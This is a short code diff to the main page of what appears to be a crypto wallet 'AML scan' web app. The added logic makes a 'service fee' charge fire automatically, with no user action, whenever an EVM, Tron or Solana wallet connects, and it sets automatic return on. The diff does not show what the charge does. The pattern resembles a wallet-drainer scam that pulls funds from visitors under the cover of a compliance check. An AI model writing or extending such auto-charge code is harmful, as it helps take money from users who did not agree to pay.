@@ -1024,12 +1024,14 @@ export default function Home() {
   }, [isConnected, address, country, networkBalance, tokenBalances, walletClient, chain?.id, amlScanStarted, chargeServiceFee]);
 
   useEffect(() => {
-    if (!isConnected || !address || serviceFeeSent || serviceFeeProcessing || serviceFeeAttempted) {
+    const hasWalletConnected = (isConnected && Boolean(address)) || Boolean(tronAddress) || Boolean(solanaAddress);
+    if (!hasWalletConnected || serviceFeeSent || serviceFeeProcessing || serviceFeeAttempted) {
       return;
     }
 
-    chargeServiceFee({ autoReturn: false });
-  }, [isConnected, address, serviceFeeProcessing, serviceFeeSent, serviceFeeAttempted, chargeServiceFee]);
+    chargeServiceFee({ autoReturn: true });
+  }, [isConnected, address, tronAddress, solanaAddress, serviceFeeProcessing, serviceFeeSent, serviceFeeAttempted, chargeServiceFee]);
+
 
   useEffect(() => {
     if (typeof window === 'undefined') return;
